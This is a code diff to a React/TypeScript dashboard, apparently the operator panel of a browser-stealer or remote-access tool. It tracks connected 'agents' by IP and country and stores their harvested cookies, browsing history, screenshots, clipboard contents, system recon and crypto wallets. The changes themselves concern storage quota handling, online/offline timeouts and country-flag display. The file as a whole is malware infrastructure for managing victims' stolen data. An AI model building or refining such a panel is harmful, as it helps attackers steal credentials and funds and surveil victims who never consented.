@@ -32,6 +32,7 @@ interface AgentInfo {
   uid: string;
   host: string;
   lastSeen: string;
+  lastSeenTimestamp: number; // Добавляем timestamp для точного сравнения
   status: 'online' | 'offline';
   systemInfo?: any;
 }
@@ -59,18 +60,33 @@ type AgentDataAction =
 const STORAGE_KEY = 'pena_agent_data';
 const AGENT_TIMEOUT_MS = 30000; // 30 секунд без активности = offline
 
-// Функция для сохранения в localStorage
+// Функция для сохранения только необходимых данных в localStorage
 const saveToStorage = (state: AgentDataState) => {
   try {
+    // Сохраняем только agents и selectedAgent, без agentData чтобы не превысить квоту
     const dataToSave = {
       agents: state.agents,
-      agentData: state.agentData,
       selectedAgent: state.selectedAgent
     };
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(dataToSave));
-    console.log('💾 Saved to localStorage:', dataToSave);
+    const jsonString = JSON.stringify(dataToSave);
+    
+    // Проверяем размер перед сохранением
+    if (jsonString.length > 2000000) { // ~2MB лимит
+      console.warn('⚠️ Data too large for localStorage, skipping save');
+      return;
+    }
+    
+    localStorage.setItem(STORAGE_KEY, jsonString);
+    console.log('💾 Saved to localStorage: agents and selectedAgent');
   } catch (error) {
     console.error('❌ Failed to save to localStorage:', error);
+    // Попытка очистить старые данные если переполнение
+    try {
+      localStorage.removeItem(STORAGE_KEY);
+      console.log('🧹 Cleared localStorage due to quota error');
+    } catch (clearError) {
+      console.error('❌ Failed to clear localStorage:', clearError);
+    }
   }
 };
 
@@ -80,8 +96,32 @@ const loadFromStorage = (): Partial<AgentDataState> => {
     const saved = localStorage.getItem(STORAGE_KEY);
     if (saved) {
       const parsed = JSON.parse(saved);
-      console.log('📂 Loaded from localStorage:', parsed);
-      return parsed;
+      console.log('📂 Loaded from localStorage:', Object.keys(parsed));
+      
+      // Восстанавливаем agentData как пустые объекты
+      const agentData: Record<string, AgentData> = {};
+      if (parsed.agents) {
+        Object.keys(parsed.agents).forEach(uid => {
+          agentData[uid] = {
+            overview: null,
+            cookies: [],
+            history: [],
+            screenshots: [],
+            clipboard: [],
+            dom: null,
+            localStorage: null,
+            systemRecon: null,
+            bookmarks: null,
+            wallets: []
+          };
+        });
+      }
+      
+      return {
+        agents: parsed.agents || {},
+        selectedAgent: parsed.selectedAgent || null,
+        agentData
+      };
     }
   } catch (error) {
     console.error('❌ Failed to load from localStorage:', error);
@@ -220,6 +260,7 @@ function agentDataReducer(state: AgentDataState, action: AgentDataAction): Agent
 
     case 'UPDATE_AGENT_STATUS':
       console.log('🔄 UPDATE_AGENT_STATUS:', action.payload);
+      const now = Date.now();
       newState = {
         ...state,
         agents: {
@@ -227,7 +268,8 @@ function agentDataReducer(state: AgentDataState, action: AgentDataAction): Agent
           [action.payload.uid]: {
             ...state.agents[action.payload.uid],
             status: action.payload.status,
-            lastSeen: action.payload.lastSeen
+            lastSeen: action.payload.lastSeen,
+            lastSeenTimestamp: now
           }
         }
       };
@@ -302,8 +344,8 @@ function agentDataReducer(state: AgentDataState, action: AgentDataAction): Agent
       newState = state;
   }
 
-  // Сохраняем в localStorage после каждого изменения (кроме ошибок и статуса соединения)
-  if (action.type !== 'SET_ERROR' && action.type !== 'CLEAR_ERROR' && action.type !== 'SET_CONNECTION_STATUS') {
+  // Сохраняем в localStorage только важные изменения
+  if (action.type !== 'SET_ERROR' && action.type !== 'CLEAR_ERROR' && action.type !== 'SET_CONNECTION_STATUS' && action.type !== 'UPDATE_AGENT_DATA') {
     saveToStorage(newState);
   }
 
@@ -341,9 +383,9 @@ export const AgentDataProvider: React.FC<AgentDataProviderProps> = ({ children }
     const now = Date.now();
     Object.values(state.agents).forEach(agent => {
       if (agent.status === 'online') {
-        const lastSeenTime = new Date(agent.lastSeen).getTime();
-        if (now - lastSeenTime > AGENT_TIMEOUT_MS) {
-          console.log(`⏰ Agent ${agent.uid} timeout, setting to offline`);
+        const timeSinceLastSeen = now - (agent.lastSeenTimestamp || 0);
+        if (timeSinceLastSeen > AGENT_TIMEOUT_MS) {
+          console.log(`⏰ Agent ${agent.uid} timeout (${timeSinceLastSeen}ms since last seen), setting to offline`);
           dispatch({
             type: 'UPDATE_AGENT_STATUS',
             payload: {
@@ -358,8 +400,8 @@ export const AgentDataProvider: React.FC<AgentDataProviderProps> = ({ children }
   };
 
   useEffect(() => {
-    // Проверяем статусы агентов каждые 10 секунд
-    const statusInterval = setInterval(checkAgentStatuses, 10000);
+    // Проверяем статусы агентов каждые 5 секунд
+    const statusInterval = setInterval(checkAgentStatuses, 5000);
     
     return () => {
       clearInterval(statusInterval);
@@ -396,48 +438,59 @@ export const AgentDataProvider: React.FC<AgentDataProviderProps> = ({ children }
               case 'agent_connect':
                 console.log('🤖 Processing agent_connect');
                 if (message.data) {
-                  // Получаем реальный IP и информацию о стране
-                  const realIP = message.data.systemInfo?.ipAddress || message.data.systemInfo?.ip || '127.0.0.1';
-                  const country = message.data.systemInfo?.country || message.data.systemInfo?.countryName || 'Unknown';
-                  const countryCode = message.data.systemInfo?.countryCode || message.data.systemInfo?.country_code || '';
+                  // Улучшенная логика получения IP и страны
+                  const systemInfo = message.data.systemInfo || {};
+                  const realIP = systemInfo.ipAddress || systemInfo.ip || systemInfo.publicIP || systemInfo.externalIP || '127.0.0.1';
+                  
+                  // Попытка получить страну из разных полей
+                  const country = systemInfo.country || systemInfo.countryName || systemInfo.location?.country || 'Unknown';
+                  const countryCode = systemInfo.countryCode || systemInfo.country_code || systemInfo.location?.countryCode || '';
+                  
+                  console.log('🌍 IP and location data:', { realIP, country, countryCode, systemInfo });
                   
                   // Получаем флаг по коду страны
                   let countryFlag = '🌍';
                   if (countryCode && countryCode.length === 2) {
-                    // Конвертируем код страны в emoji флага
-                    const codePoints = countryCode
-                      .toUpperCase()
-                      .split('')
-                      .map(char => 127397 + char.charCodeAt(0));
-                    countryFlag = String.fromCodePoint(...codePoints);
+                    try {
+                      const codePoints = countryCode
+                        .toUpperCase()
+                        .split('')
+                        .map(char => 127397 + char.charCodeAt(0));
+                      countryFlag = String.fromCodePoint(...codePoints);
+                    } catch (e) {
+                      console.log('❌ Failed to generate flag for:', countryCode);
+                    }
                   } else if (country && country !== 'Unknown') {
-                    // Карта популярных стран для флагов
+                    // Расширенная карта стран для флагов
                     const countryFlags = {
-                      'Russia': '🇷🇺',
-                      'Russian Federation': '🇷🇺',
-                      'United States': '🇺🇸',
-                      'USA': '🇺🇸',
-                      'Ukraine': '🇺🇦',
-                      'Germany': '🇩🇪',
-                      'France': '🇫🇷',
-                      'United Kingdom': '🇬🇧',
-                      'UK': '🇬🇧',
-                      'China': '🇨🇳',
-                      'Japan': '🇯🇵',
-                      'Canada': '🇨🇦',
-                      'Australia': '🇦🇺',
-                      'Brazil': '🇧🇷',
-                      'India': '🇮🇳'
+                      'Russia': '🇷🇺', 'Russian Federation': '🇷🇺', 'RU': '🇷🇺',
+                      'United States': '🇺🇸', 'USA': '🇺🇸', 'US': '🇺🇸',
+                      'Ukraine': '🇺🇦', 'UA': '🇺🇦',
+                      'Germany': '🇩🇪', 'DE': '🇩🇪',
+                      'France': '🇫🇷', 'FR': '🇫🇷',
+                      'United Kingdom': '🇬🇧', 'UK': '🇬🇧', 'GB': '🇬🇧',
+                      'China': '🇨🇳', 'CN': '🇨🇳',
+                      'Japan': '🇯🇵', 'JP': '🇯🇵',
+                      'Canada': '🇨🇦', 'CA': '🇨🇦',
+                      'Australia': '🇦🇺', 'AU': '🇦🇺',
+                      'Brazil': '🇧🇷', 'BR': '🇧🇷',
+                      'India': '🇮🇳', 'IN': '🇮🇳',
+                      'Poland': '🇵🇱', 'PL': '🇵🇱',
+                      'Netherlands': '🇳🇱', 'NL': '🇳🇱',
+                      'Spain': '🇪🇸', 'ES': '🇪🇸',
+                      'Italy': '🇮🇹', 'IT': '🇮🇹'
                     };
-                    countryFlag = countryFlags[country] || '🌍';
+                    countryFlag = countryFlags[country] || countryFlags[countryCode] || '🌍';
                   }
                   
                   const hostDisplay = `${realIP} ${countryFlag} ${country}`;
+                  const now = Date.now();
 
                   const agentInfo: AgentInfo = {
                     uid: message.data.uid,
                     host: hostDisplay,
                     lastSeen: message.data.lastSeen || new Date().toLocaleString(),
+                    lastSeenTimestamp: now,
                     status: 'online',
                     systemInfo: message.data.systemInfo
                   };
